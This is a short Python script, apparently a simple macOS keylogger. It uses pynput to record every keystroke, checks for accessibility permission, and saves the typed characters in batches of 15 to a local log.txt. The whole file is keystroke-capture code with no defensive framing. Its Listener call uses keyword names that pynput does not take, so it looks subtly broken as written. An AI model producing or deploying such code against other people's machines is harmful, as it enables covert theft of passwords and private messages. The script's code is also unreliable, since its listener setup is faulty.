import pynput

from pynput.keyboard import Key, Listener


import HIServices

if not HIServices.AXIsProcessTrusted():
    print("This process is NOT a trusted accessibility client, so pynput will not "
          "function properly. Please grant accessibility access for this app in "
          "System Preferences.")


count = 0
keys = []

def key_press(key):
    global keys, count

    keys.append(key)
    count += 1
    # print("[0] pressed".format(key))

    if count >= 15:
        count = 0
        create_file(keys)
        keys = []


def create_file(keys):
    with open("log.txt", "w") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(str(k))

def key_release(key):
    if key == Key.esc:
        return False


with Listener(key_press=key_press, key_release=key_release) as listener:
    listener.join()

